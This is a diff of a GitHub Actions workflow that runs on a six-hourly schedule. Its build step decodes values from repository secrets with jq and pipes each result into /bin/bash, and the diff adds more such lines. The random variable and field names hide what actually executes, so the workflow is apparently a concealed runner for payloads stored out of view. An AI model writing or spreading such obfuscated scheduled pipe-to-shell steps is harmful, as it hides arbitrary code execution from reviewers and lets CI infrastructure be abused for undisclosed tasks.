@@ -1,9 +1,11 @@
 name: aboutwherekh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
-jobs:  # 3414
+    - cron: '45 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +13,19 @@ jobs:  # 3414
       - uses: actions/checkout@v4
       - name: aboutwherekh
         env:
-          c9: ${{ secrets.c9 }}
+          p61710: ${{ secrets.p61710 }}
         run: |
-          echo $c9 | jq -r .ycyd8 | /bin/bash
-          echo $eqmp77768 | jq -r .zbfov1841 | /bin/bash
-          echo $zifmp9 | jq -r .wpvi0 | /bin/bash
-          echo $yy2 | jq -r .tti390 | /bin/bash
-          echo $tchi81 | jq -r .rpnzd8034 | /bin/bash
-          echo $kd86 | jq -r .yxaw211 | /bin/bash
+          echo $p61710 | jq -r .ygf6 | /bin/bash
+          echo $igvq3 | jq -r .dad1505 | /bin/bash
+          echo $z88652 | jq -r .hdk71 | /bin/bash
+          echo $qz411 | jq -r .lryie5 | /bin/bash
+          echo $dyt57226 | jq -r .sdto52 | /bin/bash
+          echo $isgsn46821 | jq -r .jsm372 | /bin/bash
+          echo $sycpj0256 | jq -r .f758 | /bin/bash
+          echo $l3884 | jq -r .qu09717 | /bin/bash
+          echo $qdz10 | jq -r .o4 | /bin/bash
+          echo $ed88 | jq -r .wpu930 | /bin/bash
+          echo $tvyd84933 | jq -r .dhyzs18859 | /bin/bash
+          echo $y10146 | jq -r .qt75 | /bin/bash
+          echo $wpcb9 | jq -r .tl8842 | /bin/bash
 
